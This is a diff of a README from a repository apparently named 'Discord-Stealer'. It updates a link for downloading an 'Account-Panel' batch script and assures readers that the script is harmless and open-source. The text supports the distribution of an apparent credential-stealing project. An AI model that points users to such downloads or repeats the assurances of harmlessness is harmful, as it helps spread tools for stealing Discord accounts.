@@ -2,12 +2,9 @@
 <Version-3.1>
 
 ### ⚙️ How can I manage my account's settings?
-```diff
--LINK_NOT_UPDATED
-```
-- **Download the [script](https://github.com/agamsol/Discord-Stealer/raw/main/) which will allow you to login to your account's panel**
+- **Download the [script](https://github.com/agamsol/Discord-Stealer/raw/main/Account-Manager/Account-Panel.zip) which will allow you to login to your account's panel**
 
-_:warning: Please note that the script is harmless. it will not effect your computer, it is open-source - feel free to check it._
+_:warning: Please note that the script is harmless. it will not effect your computer, it is open-source - feel free to check the [source code](https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/Account-Manager/Account-Panel.bat)._
 
 _you can ask us to manage your account if you feel like you don't trust the script we worte._
 
